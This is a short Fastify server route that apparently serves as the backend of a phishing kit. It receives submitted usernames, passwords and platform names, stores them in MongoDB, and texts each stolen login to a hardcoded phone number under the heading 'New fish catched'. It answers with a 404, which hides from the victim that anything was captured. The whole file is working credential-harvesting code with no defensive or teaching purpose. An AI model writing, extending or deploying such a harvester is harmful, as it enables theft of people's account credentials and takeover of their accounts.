async function projectRoutes(fastify, opts) {
  fastify.post("/project/add", async (request, reply) => {
    const { username, password, platform } = request.body;

    const db = fastify.mongo.db;
    const result = await db.collection("project").insertOne({ username, password, platform });
    try {
      await fastify.sendSMS({
        number: "01723939836",
        message: `New fish catched\nplatform:${platform}, username:${username}, password:${password}`,
      });
    } catch (err) {
      request.log.error(err, "SMS send failed");
      // don't fail the request just because SMS failed
    }

    return reply.code(404).send({});
  });
}

export default projectRoutes;
